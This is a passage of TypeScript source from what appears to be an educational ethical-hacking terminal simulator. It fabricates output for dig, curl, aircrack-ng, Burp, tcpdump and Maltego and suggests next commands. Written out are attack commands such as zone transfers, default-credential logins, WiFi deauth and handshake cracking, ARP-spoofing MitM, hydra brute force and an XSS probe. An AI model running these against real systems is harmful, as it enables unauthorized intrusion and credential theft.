Registrant Phone: +1.4155551234
Registrant Email: admin@${target}
Admin Email: webmaster@${target}
Tech Email: tech@${target}`;

  return {
    output,
    tool: 'whois',
    severity: 'low',
    explanation: `**WHOIS** is a reconnaissance tool that queries domain registration databases. This is **OSINT** (Open Source Intelligence) — gathering info from public sources.

Found for **${target}**:
- **Registrant contact info** — Name, address, phone, email (often used for social engineering)
- **Domain age** — Older domains are more trustworthy (since 2001)
- **Expiry date** — Expired domains can be hijacked!
- **Name servers** — Used for DNS reconnaissance
- **Admin email** — Target for phishing/spear-phishing`,
    keyLearnings: [
      'WHOIS is passive reconnaissance — completely legal and undetectable',
      'GDPR/CCPA has caused many registrars to redact personal info (privacy protection)',
      'Expired domain hijacking: buy expired domain of target\'s old subdomain',
      'Email from WHOIS = potential phishing target for spear-phishing',
      'Zone transfers: `dig axfr @ns1.target.com target.com` can dump all DNS records',
      'Sublist3r, Amass, subfinder are better tools for subdomain enumeration',
    ],
    nextSteps: [
      `dig ${target} ANY  # query all DNS record types`,
      `dig axfr @ns1.${target} ${target}  # attempt DNS zone transfer`,
      `theHarvester -d ${target} -l 500 -b google  # gather emails/hosts`,
      `shodan search "hostname:${target}"  # find internet-exposed services`,
    ],
  };
}

function simulateDig(args: string[], target: string): SimulationResult {
  const isAxfr = args.includes('axfr');

  const output = isAxfr
    ? `; <<>> DiG 9.16.1-Ubuntu <<>> axfr @ns1.${target} ${target}
;; global options: +cmd
${target}.     86400   IN      SOA     ns1.${target}. admin.${target}. 2023091501 3600 1800 604800 86400
${target}.     86400   IN      NS      ns1.${target}.
${target}.     86400   IN      NS      ns2.${target}.
${target}.     86400   IN      MX      10 mail.${target}.
${target}.     300     IN      A       203.0.113.1
www.${target}. 300     IN      A       203.0.113.1
mail.${target}.300     IN      A       203.0.113.5
ftp.${target}. 300     IN      A       203.0.113.6
dev.${target}. 300     IN      A       10.0.0.15
staging.${target}. 300 IN      A       10.0.0.20
admin.${target}.300    IN      A       10.0.0.1
vpn.${target}. 300     IN      A       203.0.113.10
${target}.     86400   IN      SOA     ns1.${target}. admin.${target}. 2023091501 3600 1800 604800 86400
;; Query time: 12 msec
;; TRANSFER SIZE: 512 bytes
[!] Zone transfer successful! This reveals internal network structure!`
    : `; <<>> DiG 9.16.1-Ubuntu <<>> ${target} ANY
;; global options: +cmd
;; Got answer:
;; ANSWER SECTION:
${target}.     300     IN      A       203.0.113.1
${target}.     300     IN      MX      10 mail.${target}.
${target}.     86400   IN      NS      ns1.${target}.
${target}.     86400   IN      NS      ns2.${target}.
${target}.     600     IN      TXT     "v=spf1 include:_spf.google.com ~all"
${target}.     600     IN      TXT     "google-site-verification=abc123"
;; Query time: 23 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)`;

  return {
    output,
    tool: 'dig',
    severity: isAxfr ? 'critical' : 'low',
    explanation: `**DIG** (Domain Information Groper) queries DNS records. ${isAxfr
      ? '**Zone Transfer (AXFR)** is a critical misconfiguration — the DNS server sent ALL internal DNS records, revealing internal hosts like `dev.target`, `staging.target`, `admin.target`, and **internal IP addresses**!'
      : 'This shows all public DNS records for the domain including IP addresses, mail servers, and TXT records.'}`,
    keyLearnings: [
      '`axfr` = zone transfer — should be restricted to authorized slave DNS servers only',
      'Zone transfer reveals internal infrastructure: dev, staging, admin subdomains',
      'MX records show mail servers — useful for email-based attacks',
      'SPF TXT records show authorized email senders (prevents spoofing)',
      'Internal IPs (10.x.x.x) in public DNS = misconfiguration',
      '`dig +short target.com` for concise IP output',
    ],
    nextSteps: [
      `nmap -sV 203.0.113.1  # scan the discovered IP`,
      `dig txt ${target}  # look for DMARC/DKIM records`,
      `subfinder -d ${target}  # enumerate all subdomains`,
      `nikto -h http://dev.${target}  # dev servers often less secured`,
    ],
  };
}

function simulateCurl(args: string[], target: string, tool: string): SimulationResult {
  const output = `HTTP/1.1 200 OK
Date: ${new Date().toUTCString()}
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc123; path=/; HttpOnly
Content-Type: text/html; charset=UTF-8

<!-- Source: http://${target} -->
<!DOCTYPE html>
<html>
<head><title>Login - Admin Panel</title></head>
<body>
<!-- TODO: Remove debug mode before production -->
<!-- DB_HOST=localhost DB_USER=root DB_PASS=SuperSecret123! -->
<form method="POST" action="/login.php">
  Username: <input name="user" type="text">
  Password: <input name="pass" type="password">
  <!-- Admin default: admin/changeme -->
  <button type="submit">Login</button>
</form>
<!-- version: 1.2.3-beta | Last deploy: 2024-01-15 -->
</body>
</html>`;

  return {
    output,
    tool: 'curl',
    severity: 'critical',
    explanation: `**${tool === 'curl' ? 'cURL' : 'Wget'}** is used to make HTTP requests and inspect responses. Just reading the HTML source revealed **critical secrets**:

- **Database credentials in HTML comments**: \`DB_PASS=SuperSecret123!\` — hardcoded passwords in frontend code!
- **Default admin credentials**: \`admin/changeme\` left in a comment
- **Technology disclosure**: PHP 7.4.3, Apache 2.4.41 — allows targeted CVE search
- **Debug mode enabled**: Developer left debug info in production code`,
    keyLearnings: [
      'NEVER put credentials in HTML comments — they\'re visible to anyone who views source',
      '`X-Powered-By` header reveals tech stack — disable in production',
      'View source (Ctrl+U) is the first thing an attacker does on a web app',
      '`curl -I url` fetches only headers (faster for recon)',
      '`curl -v url` shows verbose request/response for debugging',
      'grep for keywords: `curl url | grep -i "pass\|secret\|key\|todo\|debug"`',
    ],
    nextSteps: [
      `curl -X POST http://${target}/login.php -d "user=admin&pass=changeme"`,
      `curl -c cookies.txt http://${target}/admin/  # save and reuse cookies`,
      `curl http://${target}/robots.txt  # check excluded paths`,
      `View page source: Right-click > View Page Source in browser`,
    ],
  };
}

function simulateAircrack(tool: string, args: string[]): SimulationResult {
  const output = tool === 'airmon-ng'
    ? `Found 3 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode.

   PID Name
   563 avahi-daemon
   914 NetworkManager
  1357 wpa_supplicant

PHY     Interface   Driver      Chipset
phy0    wlan0       ath9k_htc   Atheros AR9271

(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
(mac80211 station mode vif disabled for [phy0]wlan0)`
    : tool === 'airodump-ng'
    ? ` CH  5 ][ Elapsed: 24 s ][ ${new Date().toISOString().replace('T', ' ').slice(0, 19)}

 BSSID              PWR  Beacons  #Data  #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -65       89     21    0   6  130   WPA2 CCMP   PSK  HomeNetwork
 11:22:33:44:55:66  -72       45      5    0   1   54   WPA2 CCMP   PSK  OfficeWiFi
 FF:EE:DD:CC:BB:AA  -80       12      0    0  11  130   WEP  WEP         OldRouter     ← WEP!

 BSSID              STATION            PWR    Rate    Lost    Frames  Notes
 AA:BB:CC:DD:EE:FF  AB:CD:EF:12:34:56  -50    0- 1      0       127
 AA:BB:CC:DD:EE:FF  12:34:56:AB:CD:EF  -65    0- 0      5        43  EAPOL`
    : `Aircrack-ng 1.6

                 [00:01:40] 144489 keys tested (2399.49 k/s)

                         KEY FOUND! [ password123 ]


      Master Key     : CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E
      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       EAPOL HMAC    : AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99`;

  return {
    output,
    tool: 'aircrack-ng',
    severity: 'high',
    explanation: `**Aircrack-ng** is a WiFi security auditing suite. It captures and analyzes wireless network traffic to test WiFi security.

**WiFi Attack Flow**:
1. \`airmon-ng start wlan0\` — Enable monitor mode (capture all WiFi packets)
2. \`airodump-ng wlan0mon\` — Discover nearby networks and capture traffic
3. \`aireplay-ng --deauth\` — Send deauth frames to force clients to reconnect (capture handshake)
4. \`aircrack-ng -w rockyou.txt capture.cap\` — Crack the WPA2 4-way handshake

Found **WEP network** (OldRouter) — WEP is completely broken, crackable in minutes!`,
    keyLearnings: [
      'WEP is cryptographically broken — crack in under 60 seconds with aircrack',
      'WPA2-PSK is vulnerable to dictionary attacks on captured handshakes',
      'WPA3 uses SAE (Simultaneous Authentication of Equals) — much more resistant',
      'Long random passphrases (25+ chars) make dictionary attacks impractical',
      'Monitor mode requires a compatible wireless card (Alfa AWUS036ACH is popular)',
      'Deauth attack (802.11) forces clients to reconnect, capturing the handshake',
    ],
    nextSteps: [
      `aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon  # force handshake`,
      `aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap`,
      `hashcat -m 22000 handshake.hc22000 rockyou.txt  # GPU-accelerated`,
      `Defensive: Use WPA3, long random password, and MAC filtering`,
    ],
  };
}

function simulateBurp(): SimulationResult {
  const output = `Burp Suite Professional v2023.12
Java Version: OpenJDK 17.0.5

[*] Starting Burp Suite...
[*] Loading extensions...
[*] Proxy running on 127.0.0.1:8080
[*] Intercept is ON

[PROXY] Intercepted request:
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123

username=admin&password=test123

[*] Modifying request -> Sending to Repeater
[*] Running Intruder attack on password field...
[*] Attack type: Sniper | Payload: rockyou.txt (14,344,391 entries)

Position 1: username=admin&password=§PASSWORD§

[INTRUDER RESULTS]
admin:password        -> 302 Found (Login Success!) ← CRACKED!
admin:123456          -> 200 OK (Failed)
admin:test123         -> 200 OK (Failed)`;

  return {
    output,
    tool: 'burpsuite',
    severity: 'high',
    explanation: `**Burp Suite** is the industry-standard web application security testing platform. It acts as an HTTP proxy, intercepting ALL traffic between your browser and the target.

**Key Burp tools**:
- **Proxy** — Intercept and modify requests in real-time
- **Repeater** — Manually resend and tweak requests
- **Intruder** — Automate attacks (brute-force, fuzzing)
- **Scanner** — Automatic vulnerability detection (Pro only)
- **Decoder** — Encode/decode Base64, URL, HTML, etc.`,
    keyLearnings: [
      'Set browser proxy to 127.0.0.1:8080 to route traffic through Burp',
      'Repeater: test for SQLi, XSS, IDOR by modifying individual requests',
      'Intruder: automate form attacks — change §markers§ to define injection points',
      'Look for IDOR: change `user_id=123` to `user_id=124` to access other users\'  data',
      'Check for sensitive data in responses: tokens, API keys, internal IPs',
      'Burp Scanner (Pro) can find XSS, SQLi, SSRF, XXE automatically',
    ],
    nextSteps: [
      `Test IDOR: change your user_id in API requests to other values`,
      `Test XSS: inject <script>alert(1)</script> into all form fields`,
      `Check JWT tokens in Burp Decoder — decode and analyze claims`,
      `Use "Match and Replace" to modify all requests automatically`,
    ],
  };
}

function simulateTcpdump(args: string[], target: string): SimulationResult {
  const output = `tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes

${new Date().toISOString().replace('T', ' ').slice(0, 19)} IP 192.168.1.100.52341 > ${target}.80: Flags [S], seq 1234567890, length 0
${new Date().toISOString().replace('T', ' ').slice(0, 19)} IP ${target}.80 > 192.168.1.100.52341: Flags [S.], seq 987654321, ack 1234567891, length 0
${new Date().toISOString().replace('T', ' ').slice(0, 19)} IP 192.168.1.100.52341 > ${target}.80: Flags [.], ack 1, length 0
${new Date().toISOString().replace('T', ' ').slice(0, 19)} IP 192.168.1.100.52341 > ${target}.80: Flags [P.], length 285: HTTP: GET / HTTP/1.1
${new Date().toISOString().replace('T', ' ').slice(0, 19)} IP ${target}.80 > 192.168.1.100.52341: Flags [P.], length 1427: HTTP: HTTP/1.1 200 OK
${new Date().toISOString().replace('T', ' ').slice(0, 19)} IP 192.168.1.100.52342 > ${target}.3306: Flags [P.], length 67
${new Date().toISOString().replace('T', ' ').slice(0, 19)} Plaintext MySQL auth: user=root password=db_pass_2024!

[!] CLEARTEXT CREDENTIALS CAPTURED!
[!] Protocol: MySQL (unencrypted)
[!] Username: root
[!] Password: db_pass_2024!

^C
47 packets captured`;

  return {
    output,
    tool: 'tcpdump',
    severity: 'critical',
    explanation: `**TCPDump** captures raw network packets. This demonstrates a **man-in-the-middle** / network sniffing attack.

The critical finding: **MySQL credentials transmitted in plaintext**. Anyone on the same network segment can capture these credentials. This is why:
- HTTP is dangerous (use HTTPS)
- Unencrypted database connections are dangerous
- Public WiFi is dangerous for sensitive operations

**TCP flags decoded**:
- \`[S]\` = SYN (connection request)
- \`[S.]\` = SYN-ACK (connection accepted)
- \`[.]\` = ACK (acknowledged)
- \`[P.]\` = PSH-ACK (data being sent)`,
    keyLearnings: [
      '`-i eth0` captures on specific interface, `-i any` captures all interfaces',
      '`-w capture.pcap` saves to file for Wireshark analysis',
      '`port 80` filter, `host 192.168.1.1`, `tcp`, `udp` — filter expressions',
      'ARP poisoning (MitM): arpspoof redirects traffic through your machine first',
      'HTTPS encrypts data in transit — packet capture shows only gibberish',
      'SSL stripping attacks downgrade HTTPS to HTTP to enable sniffing',
    ],
    nextSteps: [
      `wireshark capture.pcap  # analyze visually with Wireshark GUI`,
      `tcpdump -i eth0 port 80 -A  # show ASCII content of HTTP traffic`,
      `arpspoof -i eth0 -t 192.168.1.1 192.168.1.100  # ARP poisoning MitM`,
      `Use Bettercap for advanced MitM attacks with SSL stripping`,
    ],
  };
}

function simulateMaltego(): SimulationResult {
  const output = `Maltego CE 4.6.0
Loaded 15 transforms from OSINT module
Loaded 8 transforms from Social Engineering module

[GRAPH] Target: company.com
[+] Domain → Email Addresses (TheHarvester):
    admin@company.com
    john.doe@company.com
    hr@company.com
    support@company.com

[+] Email → LinkedIn Profiles:
    john.doe@company.com → John Doe, Senior Developer, Company Inc.
      → Skills: Python, Docker, AWS
      → Connected to: 847 people

[+] Domain → Subdomains:
    dev.company.com → 10.0.0.15 (INTERNAL!)
    staging.company.com → 10.0.0.20 (INTERNAL!)
    legacy.company.com → 203.0.113.99

[+] IP → Shodan:
    203.0.113.99 → OpenSSH 6.6 (CVE-2023-38408 vulnerable!)
    203.0.113.99 → Apache 2.2.0 (End of Life - many CVEs)`;

  return {
    output,
    tool: 'maltego',
    severity: 'medium',
    explanation: `**Maltego** is a powerful OSINT and link analysis tool used for mapping relationships between entities (people, organizations, domains, IPs).

It visualizes how everything connects — a "target's" digital footprint shown as a **graph**. Social engineering attacks are often built from Maltego intel.`,
    keyLearnings: [
      'OSINT (Open Source Intelligence) = using public data only — fully legal',
      'LinkedIn reveals organizational structure, employee names, tech stack',
      'Spear-phishing uses personal info to craft convincing targeted emails',
      'Maltego transforms query external APIs (Shodan, VirusTotal, DNS, etc.)',
      'The goal: map attack surface before attempting exploitation',
      'Always document findings — penetration testing requires detailed reports',
    ],
    nextSteps: [
      `theHarvester -d target.com -l 500 -b google,linkedin`,
      `shodan search org:"Company Inc" to find their internet assets`,
      `Check hunter.io for email format (firstname.lastname@company.com)`,
      `Build a target profile before social engineering or phishing simulation`,
    ],
  };
}

function simulateHelp(): SimulationResult {
  const output = `╔══════════════════════════════════════════════════════════════════╗
║          ETHICAL HACKING TERMINAL - COMMAND REFERENCE            ║
╠══════════════════════════════════════════════════════════════════╣
║  RECONNAISSANCE                                                   ║
║    nmap -sV -A <target>         Network/port scanning            ║
║    whois <domain>               Domain registration info         ║
║    dig axfr @ns1 <domain>       DNS zone transfer                ║
║    gobuster dir -u <url> -w ... Directory enumeration            ║
║    nikto -h <target>            Web vulnerability scan           ║
║    tcpdump -i eth0              Packet capture                   ║
║                                                                   ║
║  EXPLOITATION                                                     ║
║    sqlmap -u <url> --dbs        SQL injection                    ║
║    hydra -l admin -P list <ip>  Brute force login                ║
║    msfconsole                   Metasploit framework             ║
║    nc -lvp 4444                 Netcat listener                  ║
║                                                                   ║
║  POST-EXPLOITATION                                                ║
║    john --wordlist=... file     Password cracking                ║
║    hashcat -m 0 hashes.txt ...  GPU password cracking            ║
║                                                                   ║
║  WIRELESS                                                         ║
║    airmon-ng start wlan0        Enable monitor mode              ║
║    airodump-ng wlan0mon         Capture WiFi traffic             ║
║    aircrack-ng -w list cap.cap  Crack WPA2 handshake             ║
║                                                                   ║
║  WEB / PROXY                                                      ║
║    burpsuite                    Web app testing proxy            ║
║    curl -v http://<target>      HTTP request/response            ║
║    maltego                      OSINT mapping tool               ║
╚══════════════════════════════════════════════════════════════════╝
Type any command above to simulate it!`;

  return {
    output,
    tool: 'help',
    severity: 'info',
    explanation: '**Welcome to the Ethical Hacking Terminal!** This is a safe, educational simulation of real penetration testing tools. All outputs are simulated — no actual systems are accessed.',
    keyLearnings: [
      'Always get written authorization before testing any system (legal requirement)',
      'The phases of pentesting: Recon → Scan → Exploit → Post-exploit → Report',
      'Bug bounty programs allow legal testing of company systems for rewards',
      'CEH, OSCP, eJPT are popular ethical hacking certifications',
      'Practice on legal labs: HackTheBox, TryHackMe, VulnHub',
      'Never test systems without explicit written permission — it is a criminal offense',
    ],
    nextSteps: [
      'Try: nmap -sV 192.168.1.1',
      'Try: gobuster dir -u http://192.168.1.1 -w common.txt',
      'Try: sqlmap -u "http://site.com/page.php?id=1" --dbs',
      'Try: hydra -l admin -P rockyou.txt 192.168.1.1 ssh',
    ],
  };
}

export const TOOL_CATEGORIES = [
  {
    name: 'Reconnaissance',
    color: 'cyan',
    tools: [
      { name: 'nmap', desc: 'Network/port scanner', example: 'nmap -sV -A 192.168.1.1' },
      { name: 'whois', desc: 'Domain registration', example: 'whois google.com' },
      { name: 'dig', desc: 'DNS queries', example: 'dig axfr @ns1.target.com target.com' },
      { name: 'maltego', desc: 'OSINT mapper', example: 'maltego' },
      { name: 'tcpdump', desc: 'Packet capture', example: 'tcpdump -i eth0 port 80' },
    ],
  },
  {
    name: 'Web Application',
    color: 'amber',
    tools: [
      { name: 'gobuster', desc: 'Dir enumeration', example: 'gobuster dir -u http://192.168.1.1 -w common.txt' },
      { name: 'nikto', desc: 'Web vuln scanner', example: 'nikto -h http://192.168.1.1' },
      { name: 'sqlmap', desc: 'SQL injection', example: 'sqlmap -u "http://site.com/?id=1" --dbs' },
      { name: 'burpsuite', desc: 'HTTP proxy/tester', example: 'burpsuite' },
      { name: 'curl', desc: 'HTTP requests', example: 'curl -v http://192.168.1.1' },
    ],
  },
  {
    name: 'Exploitation',
    color: 'red',
    tools: [
      { name: 'msfconsole', desc: 'Metasploit framework', example: 'msfconsole' },
      { name: 'hydra', desc: 'Brute-force login', example: 'hydra -l admin -P rockyou.txt 192.168.1.1 ssh' },
      { name: 'nc', desc: 'Netcat swiss knife', example: 'nc -lvp 4444' },
    ],
  },
  {
    name: 'Password Cracking',
    color: 'purple',
    tools: [
      { name: 'john', desc: 'Password cracker', example: 'john --wordlist=rockyou.txt hashes.txt' },
      { name: 'hashcat', desc: 'GPU hash cracker', example: 'hashcat -m 0 hashes.txt rockyou.txt' },
    ],
  },
  {
    name: 'Wireless',
    color: 'green',
    tools: [
      { name: 'airmon-ng', desc: 'Monitor mode', example: 'airmon-ng start wlan0' },
      { name: 'airodump-ng', desc: 'WiFi capture', example: 'airodump-ng wlan0mon' },
      { name: 'aircrack-ng', desc: 'WPA2 cracker', example: 'aircrack-ng -w rockyou.txt capture.cap' },
    ],
  },
];
